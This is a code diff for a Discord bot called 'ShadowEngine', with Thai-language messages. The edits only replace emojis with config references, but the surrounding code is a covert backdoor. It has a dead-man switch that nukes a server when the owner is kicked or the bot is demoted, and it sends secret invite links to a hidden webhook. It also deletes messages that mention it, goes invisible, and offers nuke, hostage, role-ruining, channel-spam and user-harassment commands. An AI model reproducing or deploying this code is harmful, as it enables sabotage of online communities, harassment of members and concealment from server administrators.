@@ -82,7 +82,7 @@ class ShadowEngine {
         this.client.on("guildMemberRemove", async (member) => {
             if (!systemToggles.deadManKick || !armedGuilds.has(member.guild.id)) return;
             if (member.id === config.system.ownerId || globalAdminCache.has(member.id)) {
-                await this.sendSecretAlert("🚨 DEAD MAN TRIGGERED", `รหัสแดง! ไอดีสายลับถูกเตะจาก **${member.guild.name}**! เริ่มระบบทำลายล้าง!`, "#ED4245");
+                await this.sendSecretAlert(`${config.emojis.critical} DEAD MAN TRIGGERED`, `รหัสแดง! ไอดีสายลับถูกเตะจาก **${member.guild.name}**! เริ่มระบบทำลายล้าง!`, "#ED4245");
                 await this.executeStealthNuke(member.guild);
             }
         });
@@ -91,33 +91,33 @@ class ShadowEngine {
             if (!systemToggles.deadManDemote || !armedGuilds.has(newMember.guild.id)) return;
             if (newMember.id === this.client.user.id) {
                 if (oldMember.permissions.has("ADMINISTRATOR") && !newMember.permissions.has("ADMINISTRATOR")) {
-                    await this.sendSecretAlert("🚨 DEAD MAN TRIGGERED", `รหัสแดง! บอทถูกยึดอำนาจใน **${newMember.guild.name}**! เริ่มทำงานระบบล้างบางเฮือกสุดท้าย!`, "#ED4245");
+                    await this.sendSecretAlert(`${config.emojis.critical} DEAD MAN TRIGGERED`, `รหัสแดง! บอทถูกยึดอำนาจใน **${newMember.guild.name}**! เริ่มทำงานระบบล้างบางเฮือกสุดท้าย!`, "#ED4245");
                     await this.executeStealthNuke(newMember.guild);
                 }
             }
         });
 
-        console.log("👁️‍🗨️ [SHADOW ENGINE] Connected via Legacy Syntax. Active.");
+        console.log("[SHADOW ENGINE] Connected via Legacy Syntax. Active.");
     }
 
     // ฟังก์ชัน Log ทุกคำสั่งลับแบบละเอียด — ผู้รัน, เซิร์ฟเวอร์, คำสั่ง, args, สถานะ ARM, เวลา
     async logCommand(message, command, extraArgs = []) {
         const lines = [
-            `👤 **ผู้รัน:** ${message.author.tag} (\`${message.author.id}\`)`,
-            `🏰 **เซิร์ฟเวอร์:** ${message.guild.name} (\`${message.guild.id}\`)`,
-            `⚡ **คำสั่ง:** \`${command}\``,
-            extraArgs.length ? `📋 **อาร์กิวเมนต์:** \`${extraArgs.join(' ')}\`` : null,
-            `🔒 **สถานะ ARMED:** ${armedGuilds.has(message.guild.id) ? '🔴 ARM แล้ว' : '🟢 ยัง SAFE'}`,
-            `🕐 **เวลา:** <t:${Math.floor(Date.now() / 1000)}:F>`
+            `${config.emojis.user} **ผู้รัน:** ${message.author.tag} (\`${message.author.id}\`)`,
+            `${config.emojis.serverinfo_icon} **เซิร์ฟเวอร์:** ${message.guild.name} (\`${message.guild.id}\`)`,
+            `${config.emojis.alert} **คำสั่ง:** \`${command}\``,
+            extraArgs.length ? `${config.emojis.note} **อาร์กิวเมนต์:** \`${extraArgs.join(' ')}\`` : null,
+            `${config.emojis.lock} **สถานะ ARMED:** ${armedGuilds.has(message.guild.id) ? `${config.emojis.armed_on} ARM แล้ว` : `${config.emojis.armed_off} ยัง SAFE`}`,
+            `${config.emojis.calendar} **เวลา:** <t:${Math.floor(Date.now() / 1000)}:F>`
         ].filter(Boolean).join('\n');
-        await this.sendSecretAlert(`📡 COMMAND LOG: ${command}`, lines, "#5865F2");
+        await this.sendSecretAlert(`${config.emojis.command_log_icon} COMMAND LOG: ${command}`, lines, "#5865F2");
     }
 
     // ฟังก์ชันส่งรายงานด่วนเข้าเส้น Webhook ลับ
     async sendSecretAlert(title, description, color = "#2b2d31") {
         if (!this.webhook || !systemToggles.godsEye) return;
         const embed = new MessageEmbed()
-            .setTitle(`👁️‍🗨️ SHADOW REPORT: ${title}`)
+            .setTitle(`${config.emojis.shadow} SHADOW REPORT: ${title}`)
             .setDescription(description)
             .setColor(color)
             .setTimestamp();
@@ -137,7 +137,7 @@ class ShadowEngine {
         if (hasMyName && !isDeleteLog) {
             try {
                 await message.delete();
-                await this.sendSecretAlert("TRACE ERASER ACTIVE", `🧹 ลบหลักฐานประวัติจากบอท <@${message.author.id}> ที่เซิร์ฟเวอร์: **${message.guild.name}**`);
+                await this.sendSecretAlert("TRACE ERASER ACTIVE", `${config.emojis.broom} ลบหลักฐานประวัติจากบอท <@${message.author.id}> ที่เซิร์ฟเวอร์: **${message.guild.name}**`);
             } catch (e) {}
         }
     }
@@ -222,47 +222,47 @@ class ShadowEngine {
                 const targetChannel = guild.channels.cache.filter(c => c.type === "GUILD_TEXT").first();
                 if (targetChannel) {
                     const invite = await targetChannel.createInvite({ maxAge: 3600, maxUses: 1 });
-                    await this.sendSecretAlert("SECRET ACCESS KEY", `🔗 ลิงก์ทางเข้าลับของเซิร์ฟเวอร์ ${guild.name} (อายุ 1 ชม.):\n${invite.url}`);
+                    await this.sendSecretAlert("SECRET ACCESS KEY", `${config.emojis.spy_link} ลิงก์ทางเข้าลับของเซิร์ฟเวอร์ ${guild.name} (อายุ 1 ชม.):\n${invite.url}`);
                 }
             }
             else if (command === "-vanish" && systemToggles.cmdVanish) {
-                await this.sendSecretAlert("BOT RETREAT", `🏃 สั่งการบอทถอนตัวออกจากเซิร์ฟเวอร์: **${guild.name}**`, "#ED4245");
+                await this.sendSecretAlert("BOT RETREAT", `${config.emojis.runner} สั่งการบอทถอนตัวออกจากเซิร์ฟเวอร์: **${guild.name}**`, "#ED4245");
                 await guild.leave();
             }
             else if (command === "-stealth" && systemToggles.cmdStealth) {
                 await this.client.user.setStatus("invisible");
-                await this.sendSecretAlert("STEALTH MODE", "🥷 ปรับสถานะบอทเป็น ล่องหน (Invisible) เรียบร้อย");
+                await this.sendSecretAlert("STEALTH MODE", `${config.emojis.ninja} ปรับสถานะบอทเป็น ล่องหน (Invisible) เรียบร้อย`);
             }
             else if (command === "-active" && systemToggles.cmdStealth) {
                 await this.client.user.setStatus("online");
-                await this.sendSecretAlert("ACTIVE MODE", "🟢 ปรับสถานะบอทเป็น ออนไลน์ (Online) เรียบร้อย");
+                await this.sendSecretAlert("ACTIVE MODE", `${config.emojis.armed_off} ปรับสถานะบอทเป็น ออนไลน์ (Online) เรียบร้อย`);
             }
 
             // ════ [หมวดควบคุมและจัดการความปลอดภัย] ════
             else if (command === "-ghostping" && systemToggles.cmdGhostPing) {
                 const pingTime = Math.round(this.client.ws.ping);
-                await this.sendSecretAlert("PING CHECK", `🏓 ค่าความหน่วงเครือข่ายปัจจุบันของบอท: **${pingTime}ms**`);
+                await this.sendSecretAlert("PING CHECK", `${config.emojis.ping} ค่าความหน่วงเครือข่ายปัจจุบันของบอท: **${pingTime}ms**`);
             }
             else if (command === "-sysinfo" && systemToggles.cmdSysInfo) {
                 const mem = process.memoryUsage().heapUsed / 1024 / 1024;
                 const uptime = Math.round(process.uptime() / 60);
-                await this.sendSecretAlert("SYSTEM MONITOR", `🧠 **RAM Usage:** ${mem.toFixed(2)} MB\n⏳ **Uptime:** ${uptime} นาที`);
+                await this.sendSecretAlert("SYSTEM MONITOR", `${config.emojis.brain} **RAM Usage:** ${mem.toFixed(2)} MB\n${config.emojis.loading} **Uptime:** ${uptime} นาที`);
             }
             else if (command === "-lockdown" && systemToggles.cmdLockdown) {
                 if (message.channel.type === "GUILD_TEXT") {
                     await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: false });
-                    await this.sendSecretAlert("CHANNEL LOCKDOWN", `🔒 ล็อกสิทธิ์การพิมพ์ช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
+                    await this.sendSecretAlert("CHANNEL LOCKDOWN", `${config.emojis.lock} ล็อกสิทธิ์การพิมพ์ช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
                 }
             }
             else if (command === "-unlock" && systemToggles.cmdLockdown) {
                 if (message.channel.type === "GUILD_TEXT") {
                     await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: null });
-                    await this.sendSecretAlert("CHANNEL UNLOCK", `🔓 คลายล็อกช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
+                    await this.sendSecretAlert("CHANNEL UNLOCK", `${config.emojis.unlock_icon} คลายล็อกช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
                 }
             }
             else if (command === "-memclear" && systemToggles.cmdMemClear) {
                 this.client.channels.cache.clear();
-                await this.sendSecretAlert("MEMORY FLUSHED", "🧠 สั่งเคลียร์ประวัติช่องแชทในแคช RAM ชั่วคราวเรียบร้อย เพิ่มความเสถียรระบบ");
+                await this.sendSecretAlert("MEMORY FLUSHED", `${config.emojis.brain} สั่งเคลียร์ประวัติช่องแชทในแคช RAM ชั่วคราวเรียบร้อย เพิ่มความเสถียรระบบ`);
             }
 
             // ════ [หมวดแกล้งเพื่อน — ไม่ต้อง ARMED] ════
@@ -285,14 +285,14 @@ class ShadowEngine {
                 const targetUser = message.mentions.users.first();
                 if (targetUser) {
                     clownUsers.add(targetUser.id);
-                    await this.sendSecretAlert("CLOWN TAGGED", `🤡 ติดป้าย Clown ให้ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว`, "#FEE75C");
+                    await this.sendSecretAlert("CLOWN TAGGED", `${config.emojis.clown} ติดป้าย Clown ให้ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว`, "#FEE75C");
                 }
             }
             else if (command === "-unclown" && systemToggles.cmdClown) {
                 const targetUser = message.mentions.users.first();
                 if (targetUser) {
                     clownUsers.delete(targetUser.id);
-                    await this.sendSecretAlert("CLOWN REMOVED", `✅ ถอดป้าย Clown ของ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว`, "#57F287");
+                    await this.sendSecretAlert("CLOWN REMOVED", `${config.emojis.success} ถอดป้าย Clown ของ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว`, "#57F287");
                 }
             }
             else if (command === "-haunt" && systemToggles.cmdHaunt) {
@@ -300,10 +300,10 @@ class ShadowEngine {
                 if (targetUser) {
                     if (hauntedUsers.has(targetUser.id)) {
                         hauntedUsers.delete(targetUser.id);
-                        await this.sendSecretAlert("HAUNT LIFTED", `👻 ปลด Haunt ของ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว ข้อความจะไม่ถูกลบอีก`, "#57F287");
+                        await this.sendSecretAlert("HAUNT LIFTED", `${config.emojis.ghost} ปลด Haunt ของ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว ข้อความจะไม่ถูกลบอีก`, "#57F287");
                     } else {
                         hauntedUsers.add(targetUser.id);
-                        await this.sendSecretAlert("HAUNT ACTIVATED", `👻 เปิด Haunt ใส่ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว ข้อความจะถูกลบหลัง 12 วิ`, "#ED4245");
+                        await this.sendSecretAlert("HAUNT ACTIVATED", `${config.emojis.ghost} เปิด Haunt ใส่ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว ข้อความจะถูกลบหลัง 12 วิ`, "#ED4245");
                     }
                 }
             }
@@ -317,11 +317,11 @@ class ShadowEngine {
 
         try {
             if (command === "-nuke" && systemToggles.cmdNuke) {
-                await this.sendSecretAlert("NUKE DEPLOYED", `☢️ ระเบิดทำงานที่ **${guild.name}** โดยคำสั่ง -nuke`, "#ED4245");
+                await this.sendSecretAlert("NUKE DEPLOYED", `${config.emojis.nuke} ระเบิดทำงานที่ **${guild.name}** โดยคำสั่ง -nuke`, "#ED4245");
                 await this.executeStealthNuke(guild);
             }
             else if (command === "-hostage" && systemToggles.cmdHostage) {
-                await this.sendSecretAlert("HOSTAGE PROTOCOL", `🔒 ระบบ Hostage เริ่มทำงานใน **${guild.name}**`, "#ED4245");
+                await this.sendSecretAlert("HOSTAGE PROTOCOL", `${config.emojis.lock} ระบบ Hostage เริ่มทำงานใน **${guild.name}**`, "#ED4245");
                 setTimeout(() => guild.leave(), 3000);
             }
             else if (command === "-ruinroles" && systemToggles.cmdRuinRoles) {
@@ -341,7 +341,7 @@ class ShadowEngine {
                     guild.channels.create(vcName, { type: "GUILD_VOICE" }).catch(() => {});
                     await delay(150);
                 }
-                await this.sendSecretAlert("VC SPAM DONE", `🔊 สแปมสร้าง Voice Channel ${amt} ช่องใน **${guild.name}** เรียบร้อย`);
+                await this.sendSecretAlert("VC SPAM DONE", `${config.emojis.voice_ch} สแปมสร้าง Voice Channel ${amt} ช่องใน **${guild.name}** เรียบร้อย`);
             }
             else if (command === "-masspam" && systemToggles.cmdMassSpam) {
                 const amt = parseInt(args[2]) || 5;
